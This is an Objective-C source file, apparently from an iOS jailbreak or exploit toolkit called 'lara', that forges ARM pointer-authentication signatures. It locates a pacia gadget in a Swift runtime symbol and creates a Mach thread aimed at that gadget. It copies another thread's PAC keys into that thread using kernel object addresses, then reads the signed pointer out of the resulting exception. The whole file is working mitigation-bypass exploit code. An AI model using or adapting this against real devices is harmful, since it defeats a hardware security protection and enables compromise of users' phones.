//
//  pac.m
//  lara
//
//  Original by seo on 4/4/26.
//

#import "pac.h"
#import "RemoteCall.h"
#import "thread.h"
#import "exc.h"
#import "utils.h"
#import "offsets.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <ptrauth.h>

#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH        0x1
#endif
#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR      0x2
#endif
#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC  0x4
#endif
#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR  0x8
#endif

uint64_t g_rc_paciagadget = 0;

uint64_t nativestrip(uint64_t address) {
    return address & 0x7fffffffffULL;
}

static uint64_t paciainline(uint64_t ptr, uint64_t modifier) {
    uint64_t val = nativestrip(ptr);
    __asm__ volatile (
        "mov x16, %[ptr]\n"
        "mov x17, %[mod]\n"
        ".long 0xDAC10230\n"   // pacia x16, x17
        "mov %[out], x16\n"
        : [out] "=r"(val)
        : [ptr] "r"(val), [mod] "r"(modifier)
        : "x16", "x17"
    );
    return val;
}

uint64_t pacia(uint64_t ptr, uint64_t modifier) {
    return paciainline(ptr, modifier);
}

uint64_t ptrauthblend(uint64_t diver, uint64_t discriminator) {
    return (diver & 0xFFFFFFFFFFFFULL) | discriminator;
}

uint64_t ptrauthstrdisc(const char *name) {
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

bool pacsignworks(void) {
    if (!is_pac_supported()) {
        return true;
    }

    void *pcSymbol = dlsym(RTLD_DEFAULT, "getpid");
    if (!pcSymbol) {
        pcSymbol = (void *)&pacsignworks;
    }

    uint64_t pcprobe = nativestrip((uint64_t)pcSymbol);
    uint64_t lrprobe = nativestrip((uint64_t)&pacsignworks);
    uint64_t pcsigned = pacia(pcprobe, ptrauth_string_discriminator("pc"));
    uint64_t lrsigned = pacia(lrprobe, ptrauth_string_discriminator("lr"));
    return pcsigned != pcprobe || lrsigned != lrprobe;
}

uint64_t findpacia(void) {
    const uint32_t gadgetopcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    
    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");
    if (!sym) {
        printf("(pac) $sSwySWSnySiGciM symbol not found\n");
        return 0;
    }
    
    uint64_t symaddr = nativestrip((uint64_t)sym);
    uint8_t *srcbase = (uint8_t *)(uintptr_t)symaddr;
    
    for (size_t offset = 0; offset + sizeof(gadgetopcodes) <= 0x1000; offset += 4) {
        if (memcmp(srcbase + offset, gadgetopcodes, sizeof(gadgetopcodes)) == 0) {
            printf("(pac) found pacia gadget, gadget addr = 0x%llx\n", symaddr + offset);
            return symaddr + offset;
        }
    }
    
    printf("(pac) couldn't find pacia gadget :(\n");
    return 0;
}

void paccleanup(mach_port_t pacthread, mach_port_t excport, void *stack) {
    if (pacthread != MACH_PORT_NULL) thread_terminate(pacthread);
    if (excport != MACH_PORT_NULL) mach_port_destruct(mach_task_self_, excport, 0, 0);
    if (stack) free(stack);
}

uint64_t remotepac(uint64_t remotethread, uint64_t address, uint64_t modifier) {
    if (!is_pac_supported()) return address;

    if (!g_rc_paciagadget) {
        uint64_t gadgetaddr = findpacia();
        if (gadgetaddr == 0) {
            fflush(stdout);
            return (uint64_t)-1;
        }
        g_rc_paciagadget = gadgetaddr;
    }
    
    printf("(pac) remotepac: addr=0x%llx mod=0x%llx gadget=0x%llx\n",
           address, modifier, g_rc_paciagadget);
    fflush(stdout);

    address = nativestrip(address);

    uint64_t keya = thread_get_rop_pid(remotethread);
    uint64_t keyb = thread_get_jop_pid(remotethread);

    mach_port_t pacthread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacthread);
    if (kr != KERN_SUCCESS) {
        printf("(pac) thread_create failed, kr = %s (0x%x)\n", mach_error_string(kr), kr);
        return (uint64_t)-1;
    }

    void *stack = malloc(0x4000);
    memset(stack, 0, 0x4000);
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    state.__pc = pacia(g_rc_paciagadget, ptrauth_string_discriminator("pc"));
    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));

    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacthread;
    state.__x[16] = address;
    state.__x[17] = modifier;

    mach_port_t excport = createexcport();
    if (!excport) {
        printf("(pac) createexcport failed\n");
        paccleanup(pacthread, MACH_PORT_NULL, stack);
        return 0;
    }

    kr = thread_set_exception_ports(pacthread, EXC_MASK_BAD_ACCESS, excport, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("(pac) thread_set_exception_ports failed: 0x%x (%s)\n", kr, mach_error_string(kr));
        paccleanup(pacthread, excport, stack);
        return 0;
    }

    uint64_t pacthreadaddr = task_get_ipc_port_kobject(task_self(), pacthread);
    if (!pacthreadaddr) {
        printf("(pac) task_get_ipc_port_kobject failed\n");
        paccleanup(pacthread, excport, stack);
        return 0;
    }

    if (!threadsetstate(pacthread, pacthreadaddr, &state)) {
        printf("(pac) threadsetstate failed\n");
        fflush(stdout);
        paccleanup(pacthread, excport, stack);
        return 0;
    }
    printf("(pac) pac thread state set, swapping keys and resuming\n");
    fflush(stdout);

    threadsetpac(pacthreadaddr, keya, keyb);

    kr = thread_resume(pacthread);
    if (kr != KERN_SUCCESS) {
        printf("(pac) thread_resume failed: 0x%x (%s)\n", kr, mach_error_string(kr));
        paccleanup(pacthread, excport, stack);
        return 0;
    }

    excmsg exc;
    memset(&exc, 0, sizeof(exc));

    if (!waitexc(excport, &exc, 100, false)) {
        printf("(pac) wait_exception failed (pac thread didn't crash?)\n");
        fflush(stdout);
        paccleanup(pacthread, excport, stack);
        return 0;
    }

    uint64_t signedAddress = exc.threadState.__x[16];
    printf("(pac) remotepac result: 0x%llx\n", signedAddress);
    fflush(stdout);
    paccleanup(pacthread, excport, stack);

    return signedAddress;
}
